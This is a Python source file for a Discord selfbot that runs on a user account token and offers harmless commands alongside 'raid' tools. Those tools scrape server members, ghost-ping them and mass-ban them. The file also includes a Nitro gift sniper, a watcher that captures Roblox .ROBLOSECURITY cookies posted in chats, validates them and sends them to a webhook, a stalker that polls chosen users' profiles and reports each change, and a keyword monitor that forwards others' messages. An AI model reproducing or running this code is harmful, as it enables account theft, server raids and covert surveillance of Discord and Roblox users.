import os
try:
    from rgbprint import Color
    from rgbprint import gradient_print
    import requests
    import json
    import inspect
    import random
    import time
    import discum
    import calendar
    import aiohttp
    import threading
    import asyncio
    import math
    import pytz
    import discord
    from datetime import datetime
    import re
except ModuleNotFoundError: 
    os.system('python -m pip install rgbprint requests discum=1.1.0 aiohttp asyncio pytz discord datetime')








class selfBot():
    def __init__(self):
        self.load_config()
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': self.mainToken})
        if r.status_code == 200:
            data = r.json()
            self.version = "1.0.0"
            self.xprint('lime', 'VALID', f'Token is valid')
            self.clear(True)
            os.system("title Alex's SelfBot v{}".format(self.version))

            bot = discum.Client(token=self.mainToken, log=False)
            
            @bot.gateway.command
            def main(resp):
                if resp.event.ready_supplemental:
                    user = bot.gateway.session.user
                    self.xprint('cyan', 'INFO', 'Logged in as {}#{}'.format(user['username'], user['discriminator']))
                if resp.event.message:
                    m = resp.parsed.auto()
                    guildID = m['guild_id'] if 'guild_id' in m else None #Because DMs Count as Channels
                    channelID = m['channel_id']
                    messageID = m['id']
                    username = m['author']['username']
                    userid = m['author']['id']
                    discriminator = m['author']['discriminator']
                    content = m['content']
                    if userid in self.config['whitelist']: # self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}test{Color.white}')
                        args = content.split(' ')
                        cmd = args[0].lower()
                        # // MISC COMMANDS
                        if cmd == '{}test'.format(self.prefix):
                            self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}test{Color.white}')
                            r = requests.get('https://canary.discord.com/api/v10/channels/1109558086416470117/messages', headers={'authorization': self.mainToken})
                            print(f'{r.status_code} | {r.text}')
                        elif cmd == '{}help'.format(self.prefix):
                            linkhider = '||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||'
                            if len(args) == 1:
                                self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}help{Color.white}')
                                bot.editMessage(channelID, messageID, f"{linkhider}https://embed.rauf.workers.dev/?author=Alex%27s%2520Selfbot&title=Commands&description=%21help%2520%25C2%25BB%2520Shows%2520a%2520list%2520of%2520all%2520available%2520commands%255Cn%21help%2520misc%2520%25C2%25BB%2520Shows%2520a%2520list%2520of%2520all%2520miscellaneous%2520commands%250A%21help%2520raid%2520%25C2%25BB%2520Shows%2520a%2520list%2520of%2520all%2520raid%2520commands&color=a116fe&redirect=https%253A%252F%252Fdiscord.gg%252FppeWXnGs2w")
                            else:
                                self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}help {Color.cyan}{args[1]}{Color.white}')
                                if args[1] == "misc":
                                    bot.editMessage(channelID, messageID, f"{linkhider}https://embed.rauf.workers.dev/?author=Alex%27s%2520Selfbot&title=Misc%2520Commands&description=%21emojify%2520%253Ctext%253E%2520%25C2%25BB%2520Converts%2520the%2520text%2520to%2520emojis%255Cn%21poll%2520%253Cquestion%253E%2520%25C2%25BB%2520Creates%2520a%2520poll%2520with%2520the%2520options%2520%25F0%259F%2591%258E%2520and%2520%25F0%259F%2591%258D%250A%21embed%2520%253Ctext%253E%2520%25C2%25BB%2520Creates%2520an%2520embed%2520with%2520the%2520text%250A%21giveaway%2520%253Ctime%2520in%2520minutes%253E%2520%253Cprize%253E%2520%2520%25C2%25BB%2520Starts%2520a%2520giveaway&color=a116fe&redirect=https%253A%252F%252Fdiscord.gg%252FppeWXnGs2w")
                                elif args[1] == 'raid':
                                    bot.editMessage(channelID, messageID, f"{linkhider}https://embed.rauf.workers.dev/?author=Alex%27s%2520Selfbot&title=Raid%2520Commands&description=%21scrapeids%2520%25C2%25BB%2520Scrapes%2520all%2520member%2520ids%2520from%2520the%2520current%2520server%255Cn%21massmention%2520%253Camount%253E%2520%25C2%25BB%2520Ghost%2520pings%2520random%2520people%2520from%2520the%2520server%27s%2520member%2520id%2520list%250A%21massban%2520%25C2%25BB%2520Bans%2520all%2520users%2520in%2520the%2520current%2520server%250A%21purge%2520%253Camount%253E%2520%25C2%25BB%2520Deletes%2520latest%2520messages&color=a116fe&redirect=https%253A%252F%252Fdiscord.gg%252FppeWXnGs2w")
                        elif cmd == '{}emojify'.format(self.prefix): # Turn text into emojis
                            args.remove(args[0])
                            text = ' '.join(args)
                            self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}emojify {Color.cyan}{text}{Color.white}')
                            emojified = text.lower().replace(' ', '    ').replace('a', '🇦 ').replace('b', '🇧 ').replace('c', '🇨 ').replace('d', '🇩 ').replace('e', '🇪 ').replace('f', '🇫 ').replace('g', '🇬 ').replace('h', '🇭 ').replace('i', '🇮 ').replace('j', '🇯 ').replace('k', '🇰 ').replace('l', '🇱 ').replace('m', '🇲 ').replace('n', '🇳 ').replace('o', '🇴 ').replace('p', '🇵 ').replace('q', '🇶 ').replace('r', '🇷 ').replace('s', '🇸 ').replace('t', '🇹 ').replace('u', '🇺 ').replace('v', '🇻 ').replace('w', '🇼 ').replace('x', '🇽 ').replace('y', '🇾 ').replace('z', '🇿 ').replace('1', '1️⃣ ').replace('2', '2️⃣ ').replace('3', '3️⃣ ').replace('4', '4️⃣ ').replace('5', '5️⃣ ').replace('6', '6️⃣ ').replace('7', '7️⃣ ').replace('8', '8️⃣ ').replace('9', '9️⃣ ').replace('0', '0️⃣ ').replace('!', ':exclamation: ').replace('?', '❓ ').replace('$', ':heavy_dollar_sign: ').replace('+', ':heavy_plus_sign: ').replace('-', ':heavy_minus_sign: ')
                            bot.editMessage(channelID, messageID, emojified)
                        elif cmd == '{}poll'.format(self.prefix):
                            args.remove(args[0])
                            question = ' '.join(args)
                            self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}poll {Color.cyan}{question}{Color.white}')
                            bot.editMessage(channelID, messageID, "**POLL**\n\n> *{}*\n ".format(question))
                            bot.addReaction(channelID, messageID, '👍')
                            bot.addReaction(channelID, messageID, '👎')
                        elif cmd == '{}embed'.format(self.prefix):
                            args.remove(args[0])
                            desc = ' '.join(args)
                            self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}embed {Color.cyan}{desc}{Color.white}')
                            bot.editMessage(channelID, messageID, self.embed('', '', desc, 'a116fe', "", ""))
                        elif cmd == '{}giveaway'.format(self.prefix):
                            end = args[1]
                            args.remove(args[1])
                            args.remove(args[0])
                            prize = ' '.join(args)
                            asyncio.run(self.startgw(prize, end, bot, channelID, messageID))
                            
                            


                        # // RAIDING COMMANDS
                        elif cmd == '{}scrapeids'.format(self.prefix):
                            bot.deleteMessage(channelID, messageID)
                            self.xprint('cyan', 'INFO', 'Member id scraper started')
                            self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}scrapeids{Color.white}')
                            idlist = self.idscraper(guildID, channelID)

                            time.sleep(1)
                            self.clear(True)
                            with open(f'memberids/{guildID}.txt', 'w') as f:
                                f.write('')
                            with open(f'memberids/{guildID}.txt','w') as ids:
                                for element in idlist:
                                    ids.write(element + '\n') 
                                self.xprint('cyan' ,'INFO', f'Wrote {len(idlist)} ids to ./memberids/{guildID}.txt')
                        elif cmd == '{}massmention'.format(self.prefix):
                            bot.deleteMessage(channelID, messageID)
                            if len(args) > 1:
                                self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}massmention {Color.cyan}{args[1]}{Color.white}')
                            else:
                                self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}massmention{Color.white}')
                            amt = 1
                            if len(args) > 1:
                                amt = int(args[1])
                            else:
                                amt = 5
                            with open(f'memberids/{guildID}.txt', 'r') as f:
                                memberids = f.readlines()
                            message = ""
                            for i in range(amt):
                                userid = random.choice(memberids).strip()
                                message = f"{message} <@{userid}>"
                            r = bot.sendMessage(channelID, message).json()
                            bot.deleteMessage(channelID, r['id'])
                        elif cmd == '{}massban'.format(self.prefix):
                            args.remove(args[0])
                            reason = ' '.join(args) or "Alex's Selfbot"
                            try:
                                with open(f"memberids/{guildID}.txt") as f:
                                    memberids = f.readlines()
                            except FileNotFoundError:
                                print('This action requires id scraping.')
                                return
                            for m in memberids:
                                member = m.strip()
                                if not userid == member or member in self.config['whitelist']:
                                    self.xprint('magenta', 'BAN', str(member))
                                    r = bot.ban(guildID, member, 7, reason)
                        # elif cmd == '{}ccreate'.format(self.prefix):
                        #     bot.deleteMessage(channelID, messageID)
                            
                        #     for i in range(10):
                        #         asyncio.run(self.webraid(guildID))

                        # // MODERATION COMMANDS
                        elif cmd == '{}purge'.format(self.prefix):
                            self.xprint('orange', 'Command', f'Executed command {Color.magenta}{self.prefix}purge {Color.cyan}{args[1]}{Color.white}')
                            amt = int(args[1])
                            
                            
                            bot.deleteMessage(channelID, messageID)
                            r = requests.get('https://canary.discord.com/api/v10/channels/{}/messages'.format(channelID), headers={'authorization': self.mainToken})
                            data = r.json()
                            for obj in data[:amt]:
                                id = obj['id']
                                cid = obj['channel_id']
                                bot.deleteMessage(cid, id)
                                self.xprint('orange', 'PURGE', f'Deleted {id}')

                        # // Check for NITRO Gift
                        if self.config['nitrosearcher']['enabled'] == True:
                            match = re.search(r"discord\.gift/(\w+)", content)

                            if match:
                                code = match.group(1)
                                
                                redeemheaders = {
                                'Authorization': self.mainToken,
                                'content-type': 'application/json',
                                }
                                payload = {
                                    "channel_id": channelID,
                                    "payment_source_id": None
                                }
                                r = requests.post('https://ptb.discordapp.com/api/v6/entitlements/gift-codes/'+ code + '/redeem', headers=redeemheaders, json=payload)
                                rd = r.json()
                                print(f"{r.status_code} | {rd}")
                                if r.status_code == 200:
                                    self.xprint('magenta', 'GIFT FOUND', f'discord.gift/{match.group(1)}')
                                    payload = {
                                        "content": f"GIFT FOUND ```\ndiscord.gift/{match.group(1)}```",
                                        "embeds": None,
                                        "attachments": []
                                    }
                                    requests.post(self.config['cookiesearcher']['webhook'], json=payload)
                                print(f"{r.status_code} | {rd}")

                        # // Check for ROBLOX Cookies
                        if self.config['cookiesearcher']['enabled'] == True:
                            webhookid = self.config['cookiesearcher']['webhook'].split('/')[5]
                            if userid == webhookid:
                                return
                            msg = content.replace('`', '')
                            start_index = msg.find("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
                            if start_index != -1:
                                desired_substring = msg[start_index:]
                                cookie = desired_substring.split(' ')[0]
                                r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={".ROBLOSECURITY": cookie})
                                if r.status_code == 200:
                                    self.xprint('lime', 'COOKIE FOUND', cookie)
                                    data = r.json()
                                    userid = data['id']
                                    name = data['name']
                                    display = data['displayName']
                                    payload = {
                                        "content": f"**COOKIE FOUND**\n\nUserID: `{userid}`\nUsername: `{name}`\nDisplayName: `{display}`\nCookie: ```\n{cookie}```",
                                        "embeds": None,
                                        "attachments": []
                                    }
                                    requests.post(self.config['cookiesearcher']['webhook'], json=payload)


                        # // Check for keywords
                        if self.config['keywordsearcher']['enabled'] == True:
                            webhookid = self.config['cookiesearcher']['webhook'].split('/')[5]
                            if not userid == webhookid:
                                for keyword in self.config['keywordsearcher']['keywords']:
                                    content2 = content.lower()
                                    if keyword in content2:
                                        if not guildID == None:
                                            link = f"https://discord.com/channels/{guildID}/{channelID}/{messageID}"
                                        else:
                                            link = f"https://discord.com/channels/@me/{channelID}/{messageID}"
                                        payload = {
                                        "content": f"**KEYWORD SENT**\n\nKeyword: `{keyword}`\nLink: {link}\nAuthor: `{username}#{discriminator}`\nMessage: ```{content}```",
                                        "embeds": None,
                                        "attachments": []
                                        }
                                        requests.post(self.config['keywordsearcher']['webhook'], json=payload)
            asyncio.run(self.stalker())

            

                        
            bot.gateway.run(auto_reconnect=True)
        elif r.status_code == 401:
            self.xprint('red', 'INVALID', 'Token is invalid.')
        else:
            self.xprint('orange', 'DEBUG', f'Got status code {r.status_code} when checking token.')
    def load_config(self):
        try:
            with open("config.json", 'r') as f:
                self.config = json.load(f)
            self.mainToken = self.config['token']
            self.prefix = self.config['prefix']
            self.keywordsearcher = self.config['keywordsearcher']
            self.nitrosearcher = self.config['nitrosearcher']
            self.cookiesearcher = self.config['cookiesearcher']
            self.userstalker = self.config['userstalker']
            return self
        except json.decoder.JSONDecodeError as e:
            self.xprint('red', 'JSON Decode Error', f'{e}')
            quit()


    def clear(self, showTitle):
        if showTitle == True:
            os.system('cls')
            title = '''
                   .▄▄ · ▄▄▄ .▄▄▌  ·▄▄▄▄▄▄▄·       ▄▄▄▄▄
                   ▐█ ▀. ▀▄.▀·██•  ▐▄▄·▐█ ▀█▪▪     •██  
                   ▄▀▀▀█▄▐▀▀▪▄██▪  ██▪ ▐█▀▀█▄ ▄█▀▄  ▐█.▪
                   ▐█▄▪▐█▐█▄▄▌▐█▌▐▌██▌.██▄▪▐█▐█▌.▐▌ ▐█▌·
                    ▀▀▀▀  ▀▀▀ .▀▀▀ ▀▀▀ ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 
 '''
            gradient_print(title, start_color="magenta", end_color="cyan")
        else:
            os.system('cls')

    # async def webraid(self, guildID):
    #     headers = {
    #         'authorization': self.mainToken
    #     }
    #     payload = {
    #     "name": "new-channel",
    #     "permission_overwrites": [],
    #     "type": 0
    #     }
    #     async with aiohttp.ClientSession() as session:
    #         async with session.post('https://discord.com/api/v9/guilds/{}/channels'.format(guildID), json=payload, headers=headers) as r:
    #             #print(r.status_code)
    #             if r.status == 201:
    #                 data = await r.json()
    #                 self.xprint('lime', 'CHANNEL', 'Created channel #{} ({})'.format(data['name'], data['id']))
    #                 payload = {
    #                     "name": "Webhook"
    #                 }
    #                 async with session.post('https://discord.com/api/v9/channels/{}/webhooks'.format(data['id']), headers=headers, json=payload) as r1:
    #                     data1 = await r1.json()
    #                     if r.status == 201:
    #                         self.xprint('lime', 'WEBHOOK', 'Created webhook {} ({})'.format(data['id'], data1['url']))
    #                         payload = {
    #                         "content": f"@everyone",
    #                         "embeds": None,
    #                         "attachments": []
    #                         }
    #                         async with session.post(data1['url'], json=payload) as r:
    #                             asyncio.sleep(0)
    #                     else:
    #                         print(f'{r.status} | {r.text}')
    #             elif r.status == 429:
    #                 self.xprint('orange', 'CHANNEL', 'Ratelimited')
    #             elif r.status == 403:
    #                 self.xprint('red', 'CHANNEL', 'You do not have permission to create channels in this guild.')
    #                 return


    async def stalker(self):
        ids = self.userstalker['ids']
        bot = discum.Client(token=self.userstalker['token'], log=False)
        self.xprint('green', 'STALKER', 'Monitoring {}'.format(','.join(ids)))
        webhook = self.userstalker['webhook']
        lastusername = None
        lastglobalname = None
        lastavatar = None
        lastdiscrim = None
        lastbio = None
        while True:
            await asyncio.sleep(2)
            ids = self.userstalker['ids']
            enabled = self.userstalker['enabled']
            if enabled == True:
                for id in ids:
                    r = bot.getProfile(id)
                    #print(f"{r.status_code} | {r.text}")
                    data = r.json()
                    userdata = data['user']
                    username = userdata['username']
                    globalname = userdata['global_name']
                    avatar = userdata['avatar']
                    discrim = userdata['discriminator']
                    bio = userdata['bio']
                    id = str(id)
                    if not username == lastusername and not lastusername == None:
                        payload = {
                            "content": f"**{username}#{discrim}'s Username has changed**\n\nBefore:\n> {lastusername}\n\nAfter:\n> {username}",
                            "embeds": None,
                            "attachments": []
                        }
                        requests.post(webhook, json=payload)
                    if not globalname == lastglobalname and not lastglobalname == None:
                        payload = {
                            "content": f"**{username}#{discrim}'s Global Name has changed**\n\nBefore:\n> {lastglobalname}\n\nAfter:\n> {globalname}",
                            "embeds": None,
                            "attachments": []
                        }
                        requests.post(webhook, json=payload)
                    if not avatar == lastavatar and not lastavatar == None:
                        payload = {
                            "content": f"**{username}#{discrim}'s Avatar has changed**\n\nBefore:\n> {lastavatar}\n\nAfter:\n> {avatar}",
                            "embeds": None,
                            "attachments": []
                        }
                        requests.post(webhook, json=payload)
                    if not discrim == lastdiscrim and not lastdiscrim == None:
                        payload = {
                            "content": f"**{username}#{discrim}'s Discriminator has changed**\n\nBefore:\n> {lastdiscrim}\n\nAfter:\n> {discrim}",
                            "embeds": None,
                            "attachments": []
                        }
                        requests.post(webhook, json=payload)
                    if not bio == lastbio and not lastdiscrim == None:
                        payload = {
                            "content": f"**{username}#{discrim}'s Bio has changed**\n\nBefore:\n>>> {lastbio}\n\nAfter:\n>>> {bio}",
                            "embeds": None,
                            "attachments": []
                        }
                        requests.post(webhook, json=payload)
                    lastusername = userdata['username']
                    lastglobalname = userdata['global_name']
                    lastavatar = userdata['avatar']
                    lastdiscrim = userdata['discriminator']
                    lastbio = userdata['bio']
                else:
                    return


    async def startgw(self, prize, ends, bot, channelID, messageID):
        currentunix = math.trunc(int(time.time()))
        endunix = currentunix + (int(ends)*60)
        utc_datetime = datetime.utcfromtimestamp(int(endunix))
        formatted_time = utc_datetime.strftime("%H:%M")
        embed = self.embed("Alex's Selfbot", 'Giveaway', 'Prize: {}\n\nEnds: {} UTC ({} minutes)\n\nReact with 🎉 to join!'.format(prize, formatted_time, math.trunc(int(ends))), "a116fe", "", "")
        self.xprint('magenta', 'GIVEAWAY', 'Giveaway started. Ends: {} (UTC) Prize: {}'.format(formatted_time, prize))
        bot.editMessage(channelID, messageID, embed)
        bot.addReaction(channelID, messageID, "🎉")
        while True:
            await asyncio.sleep(3)
            currentunix = math.trunc(int(time.time()))
            if currentunix > endunix:
                embed = self.embed("Alex's Selfbot", 'Giveaway', 'Prize: {}\n\nEnds: Giveaway has ended\n\nReact with 🎉 to join!'.format(prize, formatted_time), "a116fe", "", "")
                bot.editMessage(channelID, messageID, embed)
                
                r = requests.get(f'https://canary.discord.com/api/v10/channels/{channelID}/messages/{messageID}/reactions/%F0%9F%8E%89', headers={"authorization": self.mainToken})
                #print("{} | {}".format(r.status_code, r.text))
                data = r.json()
                winner = random.choice(data)
                self.xprint('magenta', 'GIVEAWAY', 'Giveaway has ended. Winner: {}#{} (UTC) Prize: {}'.format(winner['username'], winner['discriminator'], prize))
                bot.reply(channelID, messageID, self.embed("", "Giveaway Ended", "Winner: {}#{}\nPrize: {}".format(winner['username'], winner['discriminator'], prize), "a116fe", "", winner['id']))
                return
            

    def xprint(self, color, type, txt):
        spacing = '    '
        time_now = datetime.now()
        time = time_now.strftime("%H:%M:%S")
        if color == "red":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.red}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "blue":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.blue}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "cyan":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.cyan}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "green":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.green}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "lime":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.lime}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "orange":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.orange}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "magenta":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.magenta}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "purple":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.purple}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "pink":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.pink}{type}{Color.gray}] {Color.white}{txt}')
        elif color == "yellow":
            print(f'{spacing}{Color.gray}[{time}] {Color.white}-{Color.gray} [{Color.yellow}{type}{Color.gray}] {Color.white}{txt}')


    def idscraper(self, guildid, channelid):
        bot = discum.Client(token=self.mainToken)
        def close_after_fetching(resp, guild_id):
            if bot.gateway.finishedMemberFetching(guild_id):
                lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                print(str(lenmembersfetched) + ' members fetched')
                bot.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.close()

        def get_members(guild_id, channelid):
            bot.gateway.fetchMembers(guild_id, channelid, keep='all', wait=1)
            bot.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
            bot.gateway.run()
            bot.gateway.resetSession()
            return bot.gateway.session.guild(guild_id).members

        members = get_members(guildid, channelid)
        memberslist = []

        for memberID in members:
            memberslist.append(memberID)
            print(memberID)
        return memberslist

    def embed(self, author, title, description, sidebarcolor, imageurl, ping):
        linkhider = '||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||'
        author = author.replace(" ", "%20").replace("!", "%21").replace('"', '%22').replace("#", "%23") \
        .replace("$", "%24").replace("%", "%25").replace("&", "%26").replace("'", "%27") \
        .replace("(", "%28").replace(")", "%29").replace("*", "%2A").replace("+", "%2B") \
        .replace(",", "%2C").replace("-", "%2D").replace(".", "%2E").replace("/", "%2F") \
        .replace(":", "%3A").replace(";", "%3B").replace("<", "%3C").replace("=", "%3D") \
        .replace(">", "%3E").replace("?", "%3F").replace("@", "%40").replace("[", "%5B") \
        .replace("\\", "%5C").replace("]", "%5D").replace("^", "%5E").replace("_", "%5F") \
        .replace("`", "%60").replace("{", "%7B").replace("|", "%7C").replace("}", "%7D") \
        .replace("~", "%7E")
        title = title.replace(" ", "%20").replace("!", "%21").replace('"', '%22').replace("#", "%23") \
        .replace("$", "%24").replace("%", "%25").replace("&", "%26").replace("'", "%27") \
        .replace("(", "%28").replace(")", "%29").replace("*", "%2A").replace("+", "%2B") \
        .replace(",", "%2C").replace("-", "%2D").replace(".", "%2E").replace("/", "%2F") \
        .replace(":", "%3A").replace(";", "%3B").replace("<", "%3C").replace("=", "%3D") \
        .replace(">", "%3E").replace("?", "%3F").replace("@", "%40").replace("[", "%5B") \
        .replace("\\", "%5C").replace("]", "%5D").replace("^", "%5E").replace("_", "%5F") \
        .replace("`", "%60").replace("{", "%7B").replace("|", "%7C").replace("}", "%7D") \
        .replace("~", "%7E")
        description = description.replace(" ", "%20").replace("!", "%21").replace('"', '%22').replace("#", "%23") \
        .replace("$", "%24").replace("%", "%25").replace("&", "%26").replace("'", "%27") \
        .replace("(", "%28").replace(")", "%29").replace("*", "%2A").replace("+", "%2B") \
        .replace(",", "%2C").replace("-", "%2D").replace(".", "%2E").replace("/", "%2F") \
        .replace(":", "%3A").replace(";", "%3B").replace("<", "%3C").replace("=", "%3D") \
        .replace(">", "%3E").replace("?", "%3F").replace("@", "%40").replace("[", "%5B") \
        .replace("\\", "%5C").replace("]", "%5D").replace("^", "%5E").replace("_", "%5F") \
        .replace("`", "%60").replace("{", "%7B").replace("|", "%7C").replace("}", "%7D") \
        .replace("~", "%7E").replace("\n", "%0A")
        imageurl = imageurl.replace(" ", "%20").replace("!", "%21").replace('"', '%22').replace("#", "%23") \
        .replace("$", "%24").replace("%", "%25").replace("&", "%26").replace("'", "%27") \
        .replace("(", "%28").replace(")", "%29").replace("*", "%2A").replace("+", "%2B") \
        .replace(",", "%2C").replace("-", "%2D").replace(".", "%2E").replace("/", "%2F") \
        .replace(":", "%3A").replace(";", "%3B").replace("<", "%3C").replace("=", "%3D") \
        .replace(">", "%3E").replace("?", "%3F").replace("@", "%40").replace("[", "%5B") \
        .replace("\\", "%5C").replace("]", "%5D").replace("^", "%5E").replace("_", "%5F") \
        .replace("`", "%60").replace("{", "%7B").replace("|", "%7C").replace("}", "%7D") \
        .replace("~", "%7E")
        return '{} <@{}> https://embed.rauf.wtf/?author={}&title={}&description={}&color={}&image={}'.format(linkhider, ping, author.replace(' ', '%2520'), title.replace(' ', '%2520'), description.replace(' ', '%2520'), sidebarcolor, imageurl)

selfBot()
